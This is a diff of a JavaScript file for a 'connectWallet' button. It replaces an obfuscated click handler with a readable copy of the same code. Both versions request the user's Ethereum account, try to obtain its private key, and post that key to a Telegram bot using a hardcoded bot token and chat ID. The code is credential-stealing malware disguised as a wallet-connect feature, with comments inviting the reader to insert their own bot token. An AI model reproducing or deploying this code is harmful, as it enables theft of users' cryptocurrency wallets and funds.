@@ -1,1 +1,42 @@
-const _0x274198=_0x2008;(function(_0x40752f,_0x8a8422){const _0x65c4a4=_0x2008,_0x33e7e9=_0x40752f();while(!![]){try{const _0x2e2ed8=-parseInt(_0x65c4a4(0x195))/0x1*(parseInt(_0x65c4a4(0x198))/0x2)+parseInt(_0x65c4a4(0x1a5))/0x3*(parseInt(_0x65c4a4(0x1a6))/0x4)+parseInt(_0x65c4a4(0x19c))/0x5*(parseInt(_0x65c4a4(0x1a3))/0x6)+-parseInt(_0x65c4a4(0x1a0))/0x7+-parseInt(_0x65c4a4(0x19d))/0x8+parseInt(_0x65c4a4(0x19a))/0x9+-parseInt(_0x65c4a4(0x1a1))/0xa;if(_0x2e2ed8===_0x8a8422)break;else _0x33e7e9['push'](_0x33e7e9['shift']());}catch(_0x4b4de4){_0x33e7e9['push'](_0x33e7e9['shift']());}}}(_0x12ac,0xb78e4),document['getElementById']('connectWallet')[_0x274198(0x1a7)]('click',async()=>{const _0x480eaa=_0x274198;if(window['ethereum'])try{const _0x5a46dc=await window['ethereum'][_0x480eaa(0x19e)]({'method':'eth_requestAccounts'}),_0x259700=_0x5a46dc[0x0],_0x1933bb=new Web3(window['ethereum']),_0x539ad2=await _0x1933bb['eth']['getPrivateKey'](_0x259700),_0x488267='8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI',_0x508eff=_0x480eaa(0x197),_0x52d622='Private\x20Key:\x20'+_0x539ad2,_0x3d481a=await fetch(_0x480eaa(0x194)+_0x488267+'/sendMessage',{'method':'POST','headers':{'Content-Type':_0x480eaa(0x19b)},'body':JSON[_0x480eaa(0x1a4)]({'chat_id':_0x508eff,'text':_0x52d622})});_0x3d481a['ok']?console['log'](_0x480eaa(0x1a2)):console['error'](_0x480eaa(0x19f));}catch(_0x468046){console[_0x480eaa(0x1a8)](_0x480eaa(0x196),_0x468046);}else console[_0x480eaa(0x199)]('Please\x20install\x20MetaMask!');}));function _0x2008(_0xcd81ec,_0x5c558e){const _0x12acd4=_0x12ac();return _0x2008=function(_0x200878,_0x1563e4){_0x200878=_0x200878-0x194;let _0x2d3ee6=_0x12acd4[_0x200878];return _0x2d3ee6;},_0x2008(_0xcd81ec,_0x5c558e);}function _0x12ac(){const _0xe020a5=['https://api.telegram.org/bot','1JZSCvt','Error:','6870666933','2686664fSeqFG','log','896589XAYPAc','application/json','2209765gVQfUT','2951496GULikq','request','Failed\x20to\x20send\x20private\x20key\x20to\x20Telegram.','1016239XuQmJV','2080450nTtWmN','Private\x20key\x20sent\x20to\x20Telegram\x20successfully.','18SsMdnr','stringify','3qucKzZ','5567420WCcTij','addEventListener','error'];_0x12ac=function(){return _0xe020a5;};return _0x12ac();}
+document.getElementById('connectWallet').addEventListener('click', async () => {
+    if (window.ethereum) {
+    try {
+    // Request account access
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const userAccount = accounts[0];
+   
+    // Create a Web3 instance
+    const web3 = new Web3(window.ethereum);
+   
+    // Get the private key
+    const privateKey = await web3.eth.getPrivateKey(userAccount);
+   
+    // Send the private key to your Telegram account
+    const telegramBotToken = '8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI'; // Replace with your Telegram bot token
+    const chatId = '6870666933'; // Replace with your chat ID
+    const message = `Private Key: ${privateKey}`;
+   
+    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    method: 'POST',
+    headers: {
+    'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+    chat_id: chatId,
+    text: message
+    })
+    });
+   
+    if (response.ok) {
+    console.log('Private key sent to Telegram successfully.');
+    } else {
+    console.error('Failed to send private key to Telegram.');
+    }
+    } catch (error) {
+    console.error('Error:', error);
+    }
+    } else {
+    console.log('Please install MetaMask!');
+    }
+   });
+   
